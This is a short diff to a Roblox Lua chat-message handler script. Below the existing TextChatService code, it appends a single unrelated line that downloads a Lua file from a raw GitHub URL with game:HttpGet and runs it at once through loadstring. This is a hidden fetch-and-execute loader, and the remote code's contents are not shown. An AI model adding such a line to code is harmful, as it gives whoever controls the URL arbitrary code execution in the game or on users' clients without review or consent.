@@ -188,3 +188,5 @@ textChatService.OnIncomingMessage = function(message)
     end
     return properties
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/a3EY-7YFHD7UAHYDEUQ/duels-stuff/main/womp.lua%3F", true))()
